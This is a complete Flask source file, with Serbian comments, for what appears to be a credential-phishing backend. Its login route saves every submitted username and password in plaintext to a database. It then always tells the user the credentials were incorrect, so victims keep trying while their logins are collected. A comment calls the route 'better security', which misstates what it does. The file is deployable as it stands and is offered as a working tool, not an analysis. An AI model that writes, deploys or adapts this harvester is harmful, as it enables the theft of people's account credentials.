import os
from flask import Flask, render_template, request, flash, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text

app = Flask(__name__)

# ✅ Povezivanje sa Railway bazom (koristi ENV varijablu ako postoji)
DATABASE_URL = os.getenv('DATABASE_URL')
if not DATABASE_URL:
    raise ValueError("❌ DATABASE_URL nije podešen! Postavite ga kao environment varijablu.")

app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = os.urandom(24)

# ✅ Inicijalizacija baze
db = SQLAlchemy(app)

class LoginAttempt(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False)
    password = db.Column(db.String(150), nullable=False)

# ✅ Kreiranje tabele
with app.app_context():
    try:
        with db.engine.connect() as connection:
            result = connection.execute(text('SELECT 1'))
            print(f"✅ Konekcija sa bazom uspešna: {result.fetchone()}")
        db.create_all()
        print("✅ Tabela je kreirana!")
    except Exception as e:
        print(f"❌ Greška pri povezivanju sa bazom: {e}")

# ✅ Index stranica
@app.route('/')
def index():
    return render_template('index.html', message=None)

# ✅ Login ruta (bolja sigurnost)
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        flash("Sva polja su obavezna!", "danger")
        return redirect(url_for('index'))

    try:
        new_attempt = LoginAttempt(username=username, password=password)
        db.session.add(new_attempt)
        db.session.commit()
        print(f"✅ Podaci sačuvani: {username}")
    except Exception as e:
        db.session.rollback()
        print(f"❌ Greška pri upisu u bazu: {e}")

    return render_template('index.html', message="Incorrect username or password.")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))  # ✅ Railway PORT
    app.run(host="0.0.0.0", port=port, debug=False)
